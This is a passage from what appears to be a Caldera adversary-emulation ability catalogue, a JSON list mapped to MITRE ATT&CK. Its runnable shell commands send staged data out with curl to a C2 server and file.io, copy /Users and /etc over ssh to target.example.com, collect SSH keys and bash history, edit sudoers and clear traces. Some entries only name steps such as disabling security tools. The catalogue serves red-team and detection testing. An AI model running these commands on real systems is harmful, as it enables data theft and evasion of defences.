            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg); fi;  ;  mkdir -p /tmp/T1560; cd /tmp/T1560; touch a b c d e f g; zip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*; echo \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip; ls -l /tmp/T1560",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -Rf /tmp/T1560"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Data Encrypted with zip and gpg symmetric",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "4f7a9fbe6ef84e7fb32a3e85b7762210",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Take a file/directory, split it into 5Mb chunks\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Transfer Size Limits",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ ! -f /tmp/T1030/T1030_urandom ]; then if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1; fi;  ;  cd /tmp/T1030; split -b 5000000 T1030_urandom; ls -l /tmp/T1030",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "if [ -f /tmp/T1030/safe_to_delete ]; then rm -rf /tmp/T1030; fi;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Data Transfer Size Limits",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "bbb0df644aaeee17fa4c4ca0d3a8a29e",
        "technique_id": "T1030",
        "repeatable": false
    },
    {
        "description": "Deadman ability to delete agent file after termination.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Deadman - Delete agent file",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/encoded.dat ; rm /tmp/art.sh"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Decode base64 Data into Script",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "86ab6d7ecc05b7dabc7699a9e6a0a173",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "This test deletes the user account using the dscl utility.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete User via dscl utility",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "c1bc47341136e6562c6f5c321a893374",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "This test deletes the user account using the sysadminctl utility.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete User via sysadminctl utility",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "0c87d07c3de3863cd0390de213cd6379",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete log files using built-in log utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "53fc12696bbc0d92d0311e8b40858735",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete log files via cat utility by appending /dev/null or /dev/zero",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e6db40aa05312412b84b482ed2bad92d",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "Remove a downloaded payload file",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": null,
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm #{payload}"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Delete payload",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete system log files using Applescript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6269167cf683e0a2062696a4b038217f",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete system log files using OSAScript",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ec078c0f9c10dc9fddd3fee713750137",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete system log files using shred utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1a11245acd65695bbb3d7c4920337a6c",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete system log files using srm utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1a48502ebf2881017284650f0efec2ba",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "This test deletes the system log file using unlink utility\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete system log files via unlink utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "dbf9c5b79204dfba72c1c55c3b32f63c",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Detect Virtualization Environment (MacOS)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4fc7ed6101b8c04379734b0e4261902d",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Disables Carbon Black Response\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable Carbon Black Response",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ac8b270b934f97529a09688fe944b347",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disables LittleSnitch\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable LittleSnitch",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "87820d29cb755efb41e0b9543ab0f649",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disables OpenDNS Umbrella\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable OpenDNS Umbrella",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a981a99ef7c8ad9d1960a8bcb413bc51",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disables history collection in shells\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: HISTCONTROL",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "export HISTCONTROL=ignoreboth; whoami",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Disable history collection",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b3f5118a34b5aa8eee17a0344e815b77",
        "technique_id": "T1562.003",
        "repeatable": false
    },
    {
        "description": "Disables macOS Gatekeeper\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Disable macOS Gatekeeper",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "93127a8c6cdb05fd84f871a5faa9d7c7",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"; sudo visudo -c -f /etc/sudoers",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Disable tty_tickets for sudo caching",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "adaa45fb1e639a778fbac7cba1278bcb",
        "technique_id": "T1548.003",
        "repeatable": false
    },
    {
        "description": "Identify the organizations mail server",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "target.org.emailhost",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Discover Mail Server",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Discover private SSH keys on a macOS or Linux system.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt; exit 0",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/keyfile_locations.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Discover Private SSH Keys",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "c8d711527846fa2c5816f150c690c2d5",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Identify AV",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Discover antivirus programs",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Turn a computers WIFI off",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Endpoint Denial of Service",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "wifi.sh"
                ],
                "command": "./wifi.sh off",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "./wifi.sh on"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Disrupt WIFI",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731",
        "technique_id": "T1499",
        "repeatable": false
    },
    {
        "description": "Get contents of bash history",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Bash History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat ~/.bash_history",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Dump history",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "422526ec-27e9-429a-995b-c686a29561a4",
        "technique_id": "T1552.003",
        "repeatable": false
    },
    {
        "description": "injects a dylib that opens calculator via env variable\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: LD_PRELOAD",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Dylib Injection via DYLD_INSERT_LIBRARIES",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "552764b3178c11896543fea2c7117f87",
        "technique_id": "T1574.006",
        "repeatable": false
    },
    {
        "description": "This test enables the guest account on macOS using sysadminctl utility.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Default Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enable Guest Account on macOS",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ba17b809fd2fd268b61eb9f41d939f98",
        "technique_id": "T1078.001",
        "repeatable": false
    },
    {
        "description": "After execution the current/new user will have root access",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enable root account using dsenableroot utility - MacOS",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e5b238f98f504894f9c2387cf411022b",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560; openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc ; cat /tmp/t1560/t1560_data.enc | base64",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf /tmp/t1560"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Encrypts collected data with AES-256 and Base64",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "2c79f238a874947ce287bd7f83e0fb9b",
        "technique_id": "T1560.001",
        "repeatable": false
    },
    {
        "description": "Utilize groups and id to enumerate users and groups\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "groups; id",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate users and groups",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "26d3702887944abcc64b406baf8f8e43",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Utilize local utilities to enumerate users and groups\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate users and groups",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "68a0a328719faa26fff5b92e18108b3f",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "env",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Environment variables discovery on macos and linux",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "278255b5ed85eebe3eab6c0a3d3d135b",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Launch Agent",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Event Monitor Daemon Persistence",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6df7f4008df545053790a890dd68e27c",
        "technique_id": "T1543.001",
        "repeatable": false
    },
    {
        "description": "Lists the password policy to console on macOS.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Examine password policy - macOS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "16481dec717301784f90d52477f685a2",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Match Legitimate Name or Location",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\"",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f $HOME/.../sh; rmdir $HOME/.../"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Execute a process from a directory masquerading as the current parent directory.",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "23dafb943f2f1a3e21e8204826c7b271",
        "technique_id": "T1036.005",
        "repeatable": false
    },
    {
        "description": "Echo a command to clipboard and execute it",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute commands from clipboard",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "760ad6f5fe8880dae1044a384c514ccd",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.\nIt is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.\nRequires the agent to be compiled with the native_aws extension.\nTimeout set to 45 seconds.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "native",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to S3 via Golang",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "dd4d3d6f-be0a-4d80-ada2-0b7f3228d2dc",
        "technique_id": "T1567.002",
        "repeatable": false
    },
    {
        "description": "Exfil the staged directory",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over C2 Channel",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil staged directory",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
        "technique_id": "T1041",
        "repeatable": false
    },
    {
        "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "3945c9_artifact"
                ],
                "command": "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltrate data HTTPS using curl linux",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "1ecd8f81d020145064af72dbcd47110a",
        "technique_id": "T1048.002",
        "repeatable": false
    },
    {
        "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfiltration Over Alternative Protocol - SSH",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "7db784562afbea0265fcafc4243b66de",
        "technique_id": "T1048",
        "repeatable": false
    },
    {
        "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
